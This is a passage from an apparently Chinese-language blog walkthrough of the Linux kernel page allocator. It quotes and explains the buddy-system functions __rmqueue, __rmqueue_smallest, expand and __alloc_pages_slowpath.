class="title">order</span>, <span class="title">int</span> <span class="title">migratetype</span>,</span></span><br><span class="line"><span class="class"><span class="title">unsigned</span> <span class="title">int</span> <span class="title">alloc_flags</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ENABLED(CONFIG_CMA)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Balance movable allocations between regular and CMA areas by</span></span><br><span class="line"><span class="comment"> * allocating from CMA when over half of the zone&#x27;s free memory</span></span><br><span class="line"><span class="comment"> * is in the CMA area.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_CMA &amp;&amp;</span><br><span class="line">    zone_page_state(zone, NR_FREE_CMA_PAGES) &gt;</span><br><span class="line">    zone_page_state(zone, NR_FREE_PAGES) / <span class="number">2</span>) &#123;</span><br><span class="line">page = __rmqueue_cma_fallback(zone, order);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">retry:</span><br><span class="line">page = __rmqueue_smallest(zone, order, migratetype);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!page)) &#123;</span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_CMA)</span><br><span class="line">page = __rmqueue_cma_fallback(zone, order);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!page &amp;&amp; __rmqueue_fallback(zone, order, migratetype,</span><br><span class="line">alloc_flags))</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看<code>__rmqueue</code>函数，可以发现其内部实际调用的还是<code>__rmqueue_smallest</code>函数进行分配的，不过前面会判断是否分配CMA，如果是则直接调用<code>__rmqueue_cma_fallback</code>进行分配。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">rmqueue_cma_fallback</span>(<span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>,</span></span><br><span class="line"><span class="class"><span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">return</span> __rmqueue_smallest(zone, order, MIGRATE_CMA);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">rmqueue_cma_fallback</span>(<span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>,</span></span><br><span class="line"><span class="class"><span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>) &#123;</span> <span class="keyword">return</span> <span class="literal">NULL</span>; &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>看其定义其实也只是修改了迁移类型之后调用<code>__rmqueue_smallest</code>函数，而整个<code>buddy system</code>最核心的函数就是<code>__rmqueue_smallest</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">rmqueue_smallest</span>(<span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>,</span></span><br><span class="line"><span class="class"><span class="title">int</span> <span class="title">migratetype</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> current_order;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> *<span class="title">area</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Find a page of the appropriate size in the preferred list */</span></span><br><span class="line"><span class="keyword">for</span> (current_order = order; current_order &lt;= MAX_ORDER; ++current_order) &#123;</span><br><span class="line">area = &amp;(zone-&gt;free_area[current_order]);</span><br><span class="line">page = get_page_from_free_area(area, migratetype);</span><br><span class="line"><span class="keyword">if</span> (!page)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">del_page_from_free_list(page, zone, current_order);</span><br><span class="line">expand(zone, page, order, current_order, migratetype);</span><br><span class="line">set_pcppage_migratetype(page, migratetype);</span><br><span class="line">trace_mm_page_alloc_zone_locked(page, order, migratetype,</span><br><span class="line">pcp_allowed_order(order) &amp;&amp;</span><br><span class="line">migratetype &lt; MIGRATE_PCPTYPES);</span><br><span class="line"><span class="keyword">return</span> page;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>希望各位还记得在前文<code>struct zone</code>段的内容，这里用文字给大家简要的回忆一下，如果记不起来最好可以点旁边的大纲看看图片。在zone中存在<code>free_area</code>字段用以存储<code>buddy system</code>按照 order 管理的页面，为一个 <code>free_area</code> 结构体数组，而其索引就是页所对应的<code>order</code>。并且<code>free_area</code>本身就是一个结构体，内部存在一个<code>free_list</code>成员其索引对应的是不同的迁移类型。</p><p>在经过简单的回忆之后我们继续看<code>__rmqueue_smallest</code>函数，这里会从传入的<code>order</code>开始进行循环，并且通过<code>order</code>在zone中找到对应的<code>free_area</code>，随后通过迁移类型获取到对应的页。在获取到对应的页之后就会进行断链操作，这里重点看一下<code>expand</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">expand</span><span class="params">(struct zone *zone, struct page *page,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">int</span> low, <span class="keyword">int</span> high, <span class="keyword">int</span> migratetype)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> size = <span class="number">1</span> &lt;&lt; high;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (high &gt; low) &#123;</span><br><span class="line">high--;</span><br><span class="line">size &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">VM_BUG_ON_PAGE(bad_range(zone, &amp;page[size]), &amp;page[size]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Mark as guard pages (or page), that will allow to</span></span><br><span class="line"><span class="comment"> * merge back to allocator when buddy will be freed.</span></span><br><span class="line"><span class="comment"> * Corresponding page table entries will not be touched,</span></span><br><span class="line"><span class="comment"> * pages will stay not present in virtual address space</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (set_page_guard(zone, &amp;page[size], high, migratetype))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">add_to_free_list(&amp;page[size], zone, high, migratetype);</span><br><span class="line">set_buddy_order(&amp;page[size], high);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在发现<code>current_order</code>大于传入的<code>order</code>时会进入循环，对大的order-1随后将size减半，随后将后半段存入到链表中并设置新的order即这里的high，前半段的page继续重复以上操作直到high &#x3D;&#x3D; low。</p><h3 id="alloc-pages-slowpath函数"><a href="#alloc-pages-slowpath函数" class="headerlink" title="__alloc_pages_slowpath函数"></a>__alloc_pages_slowpath函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *</span></span><br><span class="line"><span class="class">__<span class="title">alloc_pages_slowpath</span>(<span class="title">gfp_t</span> <span class="title">gfp_mask</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">order</span>,</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_context</span> *<span class="title">ac</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">bool</span> can_direct_reclaim = gfp_mask &amp; __GFP_DIRECT_RECLAIM;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">bool</span> costly_order = order &gt; PAGE_ALLOC_COSTLY_ORDER;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> alloc_flags;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> did_some_progress;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">compact_priority</span> <span class="title">compact_priority</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">compact_result</span> <span class="title">compact_result</span>;</span></span><br><span class="line"><span class="keyword">int</span> compaction_retries;</span><br><span class="line"><span class="keyword">int</span> no_progress_loops;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> cpuset_mems_cookie;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> zonelist_iter_cookie;</span><br><span class="line"><span class="keyword">int</span> reserve_flags;</span><br><span class="line"></span><br><span class="line">restart:</span><br><span class="line">compaction_retries = <span class="number">0</span>;</span><br><span class="line">no_progress_loops = <span class="number">0</span>;</span><br><span class="line">compact_priority = DEF_COMPACT_PRIORITY;</span><br><span class="line">cpuset_mems_cookie = read_mems_allowed_begin();</span><br><span class="line">zonelist_iter_cookie = zonelist_iter_begin();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The fast path uses conservative alloc_flags to succeed only until</span></span><br><span class="line"><span class="comment"> * kswapd needs to be woken up, and to avoid the cost of setting up</span></span><br><span class="line"><span class="comment"> * alloc_flags precisely. So we do that now.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">alloc_flags = gfp_to_alloc_flags(gfp_mask, order);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We need to recalculate the starting point for the zonelist iterator</span></span><br><span class="line"><span class="comment"> * because we might have used different nodemask in the fast path, or</span></span><br><span class="line"><span class="comment"> * there was a cpuset modification and we are retrying - otherwise we</span></span><br><span class="line"><span class="comment"> * could end up iterating over non-eligible zones endlessly.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,</span><br><span class="line">ac-&gt;highest_zoneidx, ac-&gt;nodemask);</span><br><span class="line"><span class="keyword">if</span> (!ac-&gt;preferred_zoneref-&gt;zone)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Check for insane configurations where the cpuset doesn&#x27;t contain</span></span><br><span class="line"><span class="comment"> * any suitable zone to satisfy the request - e.g. non-movable</span></span><br><span class="line"><span class="comment"> * GFP_HIGHUSER allocations from MOVABLE nodes only.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (cpusets_insane_config() &amp;&amp; (gfp_mask &amp; __GFP_HARDWALL)) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> *<span class="title">z</span> =</span> first_zones_zonelist(ac-&gt;zonelist,</span><br><span class="line">ac-&gt;highest_zoneidx,</span><br><span class="line">&amp;cpuset_current_mems_allowed);</span><br><span class="line"><span class="keyword">if</span> (!z-&gt;zone)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_KSWAPD)</span><br><span class="line">wake_all_kswapds(order, gfp_mask, ac);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The adjusted alloc_flags might result in immediate success, so try</span></span><br><span class="line"><span class="comment"> * that first</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For costly allocations, try direct compaction first, as it&#x27;s likely</span></span><br><span class="line"><span class="comment"> * that we have enough base pages and don&#x27;t need to reclaim. For non-</span></span><br><span class="line"><span class="comment"> * movable high-order allocations, do that as well, as compaction will</span></span><br><span class="line"><span class="comment"> * try prevent permanent fragmentation by migrating from blocks of the</span></span><br><span class="line"><span class="comment"> * same migratetype.</span></span><br><span class="line"><span class="comment"> * Don&#x27;t try this for allocations that are allowed to ignore</span></span><br><span class="line"><span class="comment"> * watermarks, as the ALLOC_NO_WATERMARKS attempt didn&#x27;t yet happen.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (can_direct_reclaim &amp;&amp;</span><br><span class="line">(costly_order ||</span><br><span class="line">   (order &gt; <span class="number">0</span> &amp;&amp; ac-&gt;migratetype != MIGRATE_MOVABLE))</span><br><span class="line">&amp;&amp; !gfp_pfmemalloc_allowed(gfp_mask)) &#123;</span><br><span class="line">page = __alloc_pages_direct_compact(gfp_mask, order,</span><br><span class="line">alloc_flags, ac,</span><br><span class="line">INIT_COMPACT_PRIORITY,</span><br><span class="line">&amp;compact_result);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Checks for costly allocations with __GFP_NORETRY, which</span></span><br><span class="line"><span class="comment"> * includes some THP page fault allocations</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (costly_order &amp;&amp; (gfp_mask &amp; __GFP_NORETRY)) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If allocating entire pageblock(s) and compaction</span></span><br><span class="line"><span class="comment"> * failed because all zones are below low watermarks</span></span><br><span class="line"><span class="comment"> * or is prohibited because it recently failed at this</span></span><br><span class="line"><span class="comment"> * order, fail immediately unless the allocator has</span></span><br><span class="line"><span class="comment"> * requested compaction and reclaim retry.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Reclaim is</span></span><br><span class="line"><span class="comment"> *  - potentially very expensive because zones are far</span></span><br><span class="line"><span class="comment"> *    below their low watermarks or this is part of very</span></span><br><span class="line"><span class="comment"> *    bursty high order allocations,</span></span><br><span class="line"><span class="comment"> *  - not guaranteed to help because isolate_freepages()</span></span><br><span class="line"><span class="comment"> *    may not iterate over freed pages as part of its</span></span><br><span class="line"><span class="comment"> *    linear scan, and</span></span><br><span class="line"><span class="comment"> *  - unlikely to make entire pageblocks free on its</span></span><br><span class="line"><span class="comment"> *    own.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (compact_result == COMPACT_SKIPPED ||</span><br><span class="line">    compact_result == COMPACT_DEFERRED)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Looks like reclaim/compaction is worth trying, but</span></span><br><span class="line"><span class="comment"> * sync compaction could be very expensive, so keep</span></span><br><span class="line"><span class="comment"> * using async compaction.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">compact_priority = INIT_COMPACT_PRIORITY;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">retry:</span><br><span class="line"><span class="comment">/* Ensure kswapd doesn&#x27;t accidentally go to sleep as long as we loop */</span></span><br><span class="line"><span class="keyword">if</span> (alloc_flags &amp; ALLOC_KSWAPD)</span><br><span class="line">wake_all_kswapds(order, gfp_mask, ac);</span><br><span class="line"></span><br><span class="line">reserve_flags = __gfp_pfmemalloc_flags(gfp_mask);</span><br><span class="line"><span class="keyword">if</span> (reserve_flags)</span><br><span class="line">alloc_flags = gfp_to_alloc_flags_cma(gfp_mask, reserve_flags) |</span><br><span class="line">  (alloc_flags &amp; ALLOC_KSWAPD);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Reset the nodemask and zonelist iterators if memory policies can be</span></span><br><span class="line"><span class="comment"> * ignored. These allocations are high priority and system rather than</span></span><br><span class="line"><span class="comment"> * user oriented.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!(alloc_flags &amp; ALLOC_CPUSET) || reserve_flags) &#123;</span><br><span class="line">ac-&gt;nodemask = <span class="literal">NULL</span>;</span><br><span class="line">ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,</span><br><span class="line">ac-&gt;highest_zoneidx, ac-&gt;nodemask);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Attempt with potentially adjusted zonelist and alloc_flags */</span></span><br><span class="line">page = get_page_from_freelist(gfp_mask, order, alloc_flags, ac);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller is not willing to reclaim, we can&#x27;t balance anything */</span></span><br><span class="line"><span class="keyword">if</span> (!can_direct_reclaim)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Avoid recursion of direct reclaim */</span></span><br><span class="line"><span class="keyword">if</span> (current-&gt;flags &amp; PF_MEMALLOC)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Try direct reclaim and then allocating */</span></span><br><span class="line">page = __alloc_pages_direct_reclaim(gfp_mask, order, alloc_flags, ac,</span><br><span class="line">&amp;did_some_progress);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Try direct compaction and then allocating */</span></span><br><span class="line">page = __alloc_pages_direct_compact(gfp_mask, order, alloc_flags, ac,</span><br><span class="line">compact_priority, &amp;compact_result);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Do not loop if specifically requested */</span></span><br><span class="line"><span class="keyword">if</span> (gfp_mask &amp; __GFP_NORETRY)</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Do not retry costly high order allocations unless they are</span></span><br><span class="line"><span class="comment"> * __GFP_RETRY_MAYFAIL</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (costly_order &amp;&amp; !(gfp_mask &amp; __GFP_RETRY_MAYFAIL))</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (should_reclaim_retry(gfp_mask, order, ac, alloc_flags,</span><br><span class="line"> did_some_progress &gt; <span class="number">0</span>, &amp;no_progress_loops))</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * It doesn&#x27;t make any sense to retry for the compaction if the order-0</span></span><br><span class="line"><span class="comment"> * reclaim is not able to make any progress because the current</span></span><br><span class="line"><span class="comment"> * implementation of the compaction depends on the sufficient amount</span></span><br><span class="line"><span class="comment"> * of free memory (see __compaction_suitable)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (did_some_progress &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">should_compact_retry(ac, order, alloc_flags,</span><br><span class="line">compact_result, &amp;compact_priority,</span><br><span class="line">&amp;compaction_retries))</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Deal with possible cpuset update races or zonelist updates to avoid</span></span><br><span class="line"><span class="comment"> * a unnecessary OOM kill.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (check_retry_cpuset(cpuset_mems_cookie, ac) ||</span><br><span class="line">    check_retry_zonelist(zonelist_iter_cookie))</span><br><span class="line"><span class="keyword">goto</span> restart;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Reclaim has failed us, start killing things */</span></span><br><span class="line">page = __alloc_pages_may_oom(gfp_mask, order, ac, &amp;did_some_progress);</span><br><span class="line"><span class="keyword">if</span> (page)</span><br><span class="line"><span class="keyword">goto</span> got_pg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Avoid allocations with no watermarks from looping endlessly */</span></span><br><span class="line"><span class="keyword">if</span> (tsk_is_oom_victim(current) &amp;&amp;</span><br><span class="line">    (alloc_flags &amp; ALLOC_OOM ||</span><br><span class="line">     (gfp_mask &amp; __GFP_NOMEMALLOC)))</span><br><span class="line"><span class="keyword">goto</span> nopage;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Retry as long as the OOM killer is making progress */</span></span><br><span class="line"><span class="keyword">if</span> (did_some_progress) &#123;</span><br><span class="line">no_progress_loops = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> retry;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nopage:</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Deal with possible cpuset update races or zonelist updates to avoid</span></span><br><span class="line"><span class="comment"> * a unnecessary OOM kill.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> 